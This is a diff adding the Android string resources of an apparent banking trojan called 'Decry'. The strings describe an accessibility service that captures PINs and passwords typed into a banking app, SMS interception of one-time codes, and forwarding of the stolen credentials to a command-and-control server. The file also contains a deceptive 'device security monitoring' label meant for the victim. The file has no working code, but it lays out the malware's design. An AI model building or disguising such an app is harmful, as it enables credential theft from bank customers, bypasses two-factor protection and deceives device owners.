@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="accessibility_service_description">Decry accessibility service monitors the target banking app for credential entry. This service captures PIN codes and passwords as they are typed in the banking application.</string>
+    <string name="app_name">Decry</string>
+    <string name="sms_receiver_description">SmsReceiver captures incoming SMS messages to intercept OTP codes sent to the device.</string>
+    <string name="exfiltration_description">DataExfiltratorReceiver forwards captured credentials to the command and control server.</string>
+    <string name="service_name">Decry Background Service</string>
+    <string name="service_description">Maintains device security monitoring in background</string>
+</resources>
